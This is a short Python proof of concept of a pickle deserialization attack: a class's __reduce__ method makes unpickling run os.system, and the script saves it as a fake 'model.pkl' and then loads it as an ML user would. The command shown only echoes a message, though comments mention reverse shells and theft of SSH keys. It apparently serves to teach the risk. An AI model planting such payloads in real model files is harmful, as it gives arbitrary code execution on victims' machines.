import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        """
        This magic method tells the unpickler how to 'reconstruct' the object.
        Instead of returning data, we return a callable (os.system) 
        and the command we want it to run.
        """
        # In a real attack, this could be a reverse shell or a script 
        # that steals your ~/.ssh keys or environment variables.
        command = "echo '!!! SECURITY BREACH: Arbitrary Code Executed !!!'"
        return (os.system, (command,))

def create_malicious_pickle():
    print("[+] Creating malicious pickle file...")
    payload = MaliciousPayload()
    with open("model.pkl", "wb") as f:
        pickle.dump(payload, f)
    print("[+] 'model.pkl' has been saved.\n")

def simulate_user_loading_model():
    print("[+] User is now loading the 'model.pkl'...")
    # This looks like standard ML code:
    with open("model.pkl", "rb") as f:
        data = pickle.load(f)
    print("[+] Loading complete.")

if __name__ == "__main__":
    create_malicious_pickle()
    simulate_user_loading_model()
